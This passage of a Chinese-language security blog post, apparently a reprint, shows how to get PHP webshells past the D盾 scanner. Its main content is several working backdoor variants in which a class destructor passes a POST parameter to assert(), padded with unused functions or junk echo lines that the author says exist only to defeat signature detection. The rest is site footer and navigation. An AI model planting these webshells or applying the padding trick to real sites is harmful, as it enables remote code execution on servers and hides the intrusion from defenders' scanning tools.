<span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再拿去杀</p>
+<p><img src="/2024/01/19/Webshell-Bypass/11.png" alt="image"></p>
+<p>结论很清楚了</p>
+<p>再来D盾杀一下</p>
+<p><img src="/2024/01/19/Webshell-Bypass/12.png" alt="image"></p>
+<p>不错 报2级了 这就是沙盒型查杀和正则类查杀的明显区别 怎么过呢 用构造方法即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$string</span>, <span class="variable">$start</span> = <span class="number">0</span>, <span class="variable">$length</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$strLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$length</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$length</span> = <span class="variable">$strLength</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$length</span> = (<span class="keyword">int</span>) <span class="variable">$length</span>;</span><br><span class="line">    <span class="variable">$start</span> = <span class="variable">$start</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$start</span>) : (<span class="variable">$start</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="variable">$length</span> &lt; <span class="number">0</span> ? (<span class="variable">$strLength</span> + <span class="variable">$length</span>) : <span class="variable">$start</span> + <span class="variable">$length</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$start</span> &gt; <span class="variable">$strLength</span> || (<span class="variable">$end</span> - <span class="variable">$start</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; <span class="variable">$start</span> &lt; <span class="variable">$end</span>; <span class="variable">$start</span> ++) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$string</span>[<span class="variable">$start</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Webshell-Bypass/13.png" alt="image"></p>
+<p>看到这里大家可能也很奇怪 这里都没用到mysubstr函数 放上去不是多此一举吗</p>
+<p>不好意思 恰恰不是 我们可以去掉这个函数 用D盾杀一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Webshell-Bypass/14.png" alt="image"></p>
+<p>怎么样 是不是很有趣</p>
+<p>这里放这堆代码并不是为了真的用它 而是为了过D盾的特征查杀 所以放什么函数是无所谓的。</p>
+<p>比如这样：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> pure;</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$_POST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysubstr</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;?sasasjajksjka&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Webshell-Bypass/15.png" alt="image"></p>
+<p>这里只介绍了重写substr函数 那么其他的函数可以吗 当然可以</p>
+</blockquote>
+<h3><span id="0x04写在后面">0x04：写在后面</span></h3><blockquote>
+<p>只要思想不滑坡 方法总比困难多</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Webshell/" rel="tag">Webshell</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+</section>
+
+
+        <script>setLoadingBarProgress(60);</script>
+    </main>
+
+    <footer id="footer" class="clearfix">
+
+    
+
+    <div class="social-wrapper">
+        
+            
+                <a href="https://github.com/artchen" class="social github"
+                   target="_blank" rel="external">
+                    <span class="icon icon-github"></span>
+                </a>
+            
+                <a href="/atom.xml" class="social rss"
+                   target="_blank" rel="external">
+                    <span class="icon icon-rss"></span>
+                </a>
+            
+        
+    </div>
+
+    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
+                                                                                    target="_blank">Art Chen</a>.
+    </div>
+    <div>&copy; <a href="/">氕氘氚</a></div>
+
+</footer>
+
+
+    <script>setLoadingBarProgress(80);</script>
+    <div class="overlay"></div>
+</div>
+
+<div class="site-sidebar" id="site-sidebar">
+
+    
+
+    <div class="sidebar-switch clearfix "
+         style="display: none">
+        <a class="dark-btn active" data-toggle="toc">
+            <span class="icon icon-list"></span>
+            <span class="text">Index</span>
+        </a>
+        <a class="dark-btn" data-toggle="bio">
+            <span class="icon icon-person"></span>
+            <span class="text">Bio</span>
+        </a>
+    </div>
+
+    <div class="site-toc "
+         style="display: none">
+        
+            <div class="no-index">No Index</div>
+        
+    </div>
+
+    <div class="site-bio show"
+         style="display: block">
+
+        <div class="about-me clearfix">
+            <div class="avatar">
+                <img src="/img/avatar.png"/>
+            </div>
+            <div class="info">
+                <a class="name dark-btn" href="/about">
+                    Szczecin
+                </a>
+            </div>
+            <div class="info">
+                <span class="item desc">
+                    Open your eyes to see the light in life
+                </span>
+            </div>
+        </div>
+
+        <div class="menu section">
+            <ul class="clearfix">
+                
+                    <li class="left">
+                        <a href="/about"
+                           onfocus="this.blur();"
+                           class="nav-about dark-btn block">
+                            简介
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/archives"
+                           onfocus="this.blur();"
+                           class="nav-archives dark-btn block">
+                            归档
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/categories"
+                           onfocus="this.blur();"
+                           class="nav-categories dark-btn block">
+                            分类
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/tags"
+                           onfocus="this.blur();"
+                           class="nav-tags dark-btn block">
+                            TAGs
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/WriteUP"
+                           onfocus="this.blur();"
+                           class="nav-WriteUP dark-btn block">
+                            WriteUP
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/EXP"
+                           onfocus="this.blur();"
+                           class="nav-EXP dark-btn block">
+                            EXP
+                        </a>
+                    </li>
+                
+                    <li class="left">
+                        <a href="/SRC"
+                           onfocus="this.blur();"
+                           class="nav-SRC dark-btn block">
+                            SRC
+                        </a>
+                    </li>
+                
+                    <li class="right">
+                        <a href="/Life"
+                           onfocus="this.blur();"
+                           class="nav-Life dark-btn block">
+                            Life
+                        </a>
+                    </li>
+                
+            </ul>
+        </div>
+
+    </div>
+
+    <div class="shortcuts">
+        <a href="#header" class="top window-nav dark-btn" id="go-top">
+            <span class="icon icon-chevron-thin-up"></span>
+        </a>
+        <a class="close dark-btn" id="sidebar-close">
+            <span class="icon icon-close"></span>
+        </a>
+        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+            <span class="icon icon-chevron-thin-down"></span>
+        </a>
+    </div>
+
+</div>
+
+
+
+
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>
+
+
+<script src="/js/jquery.fitvids.js"></script>
+
+<script>
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var SEARCH_SERVICE = "";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="/js/app.js"></script>
+
+
+<script src="/js/search.js"></script>
+
+
+
+
+
+<script>setLoadingBarProgress(100);</script>
+
+</body>
+</html>
